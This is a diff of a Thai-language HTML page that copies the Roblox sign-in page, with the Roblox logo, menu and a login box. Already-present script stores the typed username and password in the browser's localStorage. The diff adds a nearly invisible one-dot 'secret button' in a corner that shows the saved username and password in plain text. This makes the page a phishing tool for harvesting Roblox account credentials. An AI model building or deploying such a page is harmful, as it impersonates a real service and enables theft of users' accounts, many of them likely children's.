@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ลงชื่อเข้าใช้ Roblox</title>
   <style>
     * {
@@ -10,19 +10,20 @@
     }
 
     body {
-      background-color: #1c1c1c;
-      color: white;
-      font-family: 'Segoe UI', sans-serif;
       margin: 0;
       padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #1c1c1c;
+      color: white;
     }
 
+    /* ส่วนหัว */
     header {
       background-color: #000;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 8px 12px;
+      padding: 8px 16px;
     }
 
     .logo {
@@ -31,7 +32,8 @@
     }
 
     .logo svg {
-      margin-right: 10px;
+      width: 28px;
+      height: 28px;
     }
 
     .header-buttons {
@@ -51,9 +53,9 @@
     }
 
     .btn-outline {
-      background-color: #000;
+      background-color: #333;
       color: white;
-      border: 2px solid #444;
+      border: none;
       padding: 6px 16px;
       border-radius: 4px;
       font-weight: bold;
@@ -64,10 +66,11 @@
       background-color: transparent;
       border: none;
       color: white;
-      font-size: 18px;
+      font-size: 20px;
       cursor: pointer;
     }
 
+    /* เมนูหลัก */
     nav {
       background-color: #111;
       display: flex;
@@ -77,6 +80,7 @@
       font-size: 15px;
     }
 
+    /* กล่องล็อกอิน */
     .container {
       max-width: 400px;
       margin: 40px auto;
@@ -124,6 +128,7 @@
       cursor: pointer;
     }
 
+    /* ฟุตเตอร์ */
     footer {
       margin-top: 50px;
       font-size: 13px;
@@ -139,15 +144,42 @@
       color: #aaa;
       text-decoration: none;
     }
+
+    /* ปุ่มลับ */
+    #secret-btn {
+      position: fixed;
+      bottom: 8px;
+      right: 10px;
+      background-color: transparent;
+      border: none;
+      font-size: 10px;
+      opacity: 0.3;
+      cursor: pointer;
+    }
+
+    #secret-box {
+      position: fixed;
+      bottom: 50px;
+      right: 10px;
+      background-color: #111;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 13px;
+      display: none;
+      z-index: 999;
+      color: white;
+      max-width: 80%;
+      word-break: break-all;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Header -->
+  <!-- หัวเว็บ -->
   <header>
     <div class="logo">
-      <!-- โลโก้ Roblox SVG -->
-      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 512 512" fill="white">
+      <!-- โลโก้ Roblox แบบ SVG -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="white">
         <path d="M109.1 32L32 403.2 403.2 480 480 109.1 109.1 32zM335.1 335.1l-158.2-34.6 34.6-158.2 158.2 34.6-34.6 158.2z"/>
       </svg>
     </div>
@@ -158,7 +190,7 @@
     </div>
   </header>
 
-  <!-- Menu -->
+  <!-- เมนู -->
   <nav>
     <div>อันดับ</div>
     <div>มาร์เก็ตเพลส</div>
@@ -166,7 +198,7 @@
     <div>Robux</div>
   </nav>
 
-  <!-- Login Box -->
+  <!-- กล่องลงชื่อเข้าใช้ -->
   <div class="container">
     <h2>ลงชื่อเข้าใช้ Roblox</h2>
     <input type="text" id="username" placeholder="ชื่อผู้ใช้/อีเมล/หมายเลขโทรศัพท์">
@@ -180,7 +212,7 @@
     <div style="margin-top: 15px;">ยังไม่มีบัญชีใช่ไหม? <a href="#">ลงทะเบียน</a></div>
   </div>
 
-  <!-- Footer -->
+  <!-- ฟุตเตอร์ -->
   <footer>
     <a href="#">เกี่ยวกับเรา</a>
     <a href="#">งาน</a>
@@ -193,6 +225,10 @@
     <a href="#">ความเป็นส่วนตัว</a>
     <a href="#">ตัวเลือกสำหรับความเป็นส่วนตัวของคุณ</a>
   </footer>
+
+  <!-- ปุ่มลับ -->
+  <button id="secret-btn" onclick="toggleSecret()">.</button>
+  <div id="secret-box"></div>
 
   <!-- Script -->
   <script>
@@ -214,6 +250,19 @@
       document.getElementById('username').value = localStorage.getItem('roblox_username') || '';
       document.getElementById('password').value = localStorage.getItem('roblox_password') || '';
     };
+
+    // ปุ่มลับ
+    function toggleSecret() {
+      const box = document.getElementById("secret-box");
+      if (box.style.display === "block") {
+        box.style.display = "none";
+      } else {
+        const u = localStorage.getItem('roblox_username') || '(ไม่มีชื่อผู้ใช้)';
+        const p = localStorage.getItem('roblox_password') || '(ไม่มีรหัสผ่าน)';
+        box.innerText = `ชื่อผู้ใช้: ${u}\nรหัสผ่าน: ${p}`;
+        box.style.display = "block";
+      }
+    }
   </script>
 
 </body>
